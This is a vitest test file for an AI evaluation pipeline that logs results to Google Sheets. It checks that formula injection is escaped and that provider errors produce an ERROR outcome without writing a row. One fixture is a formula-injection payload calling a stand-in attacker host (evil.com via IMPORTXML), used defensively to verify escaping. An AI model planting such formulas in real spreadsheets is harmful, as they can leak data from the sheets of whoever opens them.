import { describe, it, expect } from "vitest";
import { runPipeline } from "../../lib/pipeline";
import { MockProvider } from "../../lib/providers/mock";
import { FakeSheetsClient } from "../../lib/sheets/fakeClient";
import { config } from "../../lib/config";
import type { CaseInput } from "../../lib/schema";

const baseCase: CaseInput = {
  characterId: "beaver",
  title: "Escape test case",
  memory: [
    {
      type: "conversation",
      date: "2024-01-01",
      content: "User: Hi\nAgent: Hello",
    },
  ],
  prompt: "What did the user say?",
  expectedAnswer: "Hi",
  questionType: "single-session recall",
  evidence: "User: Hi",
};

describe("formula injection escaping", () => {
  it("prompt starting with =IMPORTXML( is written as escaped text in the sheet", async () => {
    const dangerousCase: CaseInput = {
      ...baseCase,
      prompt: "=IMPORTXML('https://evil.com', '//a')",
    };

    const testProvider = new MockProvider("fail");
    const judgeProvider = new MockProvider("fail");
    const sheets = new FakeSheetsClient();

    await runPipeline(dangerousCase, testProvider, judgeProvider, sheets);

    const rows = sheets.getAllRows(config.sheetTabs.all);
    expect(rows).toHaveLength(1);
    // Column 8 = Prompt
    const promptCell = rows[0][8];
    expect(promptCell).toMatch(/^'/); // must be prefixed with '
    expect(promptCell).not.toMatch(/^=IMPORTXML/); // must not be a raw formula
  });

  it("expected answer starting with = is escaped", async () => {
    const dangerousCase: CaseInput = {
      ...baseCase,
      expectedAnswer: "=SUM(A1:A10)",
    };

    const testProvider = new MockProvider("fail");
    const judgeProvider = new MockProvider("fail");
    const sheets = new FakeSheetsClient();

    await runPipeline(dangerousCase, testProvider, judgeProvider, sheets);

    const rows = sheets.getAllRows(config.sheetTabs.all);
    // Column 9 = Expected answer
    expect(rows[0][9]).toBe("'=SUM(A1:A10)");
  });
});

describe("provider error → ERROR outcome", () => {
  it("returns ERROR when test provider throws", async () => {
    const errorProvider = new MockProvider("error");
    const judgeProvider = new MockProvider("pass");
    const sheets = new FakeSheetsClient();

    const result = await runPipeline(baseCase, errorProvider, judgeProvider, sheets);

    expect(result.outcome).toBe("ERROR");
  });

  it("ERROR result is never PASS, FAIL, or FLAGGED", async () => {
    const errorProvider = new MockProvider("error");
    const judgeProvider = new MockProvider("pass");
    const sheets = new FakeSheetsClient();

    const result = await runPipeline(baseCase, errorProvider, judgeProvider, sheets);

    expect(["PASS", "FAIL", "FLAGGED"]).not.toContain(result.outcome);
  });

  it("ERROR result does not write a row to Sheets", async () => {
    const errorProvider = new MockProvider("error");
    const judgeProvider = new MockProvider("pass");
    const sheets = new FakeSheetsClient();

    await runPipeline(baseCase, errorProvider, judgeProvider, sheets);

    expect(sheets.getAllRows(config.sheetTabs.all)).toHaveLength(0);
  });
});
